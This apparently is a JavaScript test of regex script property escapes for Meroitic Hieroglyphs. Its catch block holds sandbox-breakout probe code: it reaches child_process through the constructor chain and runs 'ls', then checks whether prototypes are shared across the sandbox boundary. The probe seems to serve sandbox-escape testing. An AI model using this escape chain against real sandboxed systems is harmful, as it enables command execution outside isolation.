try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [[
                67968,
                67999
            ]]
    });
    testPropertyEscapes(/^\p{Script=Meroitic_Hieroglyphs}+$/u, matchSymbols, '\\p{Script=Meroitic_Hieroglyphs}');
    testPropertyEscapes(/^\p{Script=Mero}+$/u, matchSymbols, '\\p{Script=Mero}');
    testPropertyEscapes(/^\p{sc=Meroitic_Hieroglyphs}+$/u, matchSymbols, '\\p{sc=Meroitic_Hieroglyphs}');
    testPropertyEscapes(/^\p{sc=Mero}+$/u, matchSymbols, '\\p{sc=Mero}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                67967
            ],
            [
                68000,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script=Meroitic_Hieroglyphs}+$/u, nonMatchSymbols, '\\P{Script=Meroitic_Hieroglyphs}');
    testPropertyEscapes(/^\P{Script=Mero}+$/u, nonMatchSymbols, '\\P{Script=Mero}');
    testPropertyEscapes(/^\P{sc=Meroitic_Hieroglyphs}+$/u, nonMatchSymbols, '\\P{sc=Meroitic_Hieroglyphs}');
    testPropertyEscapes(/^\P{sc=Mero}+$/u, nonMatchSymbols, '\\P{sc=Mero}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}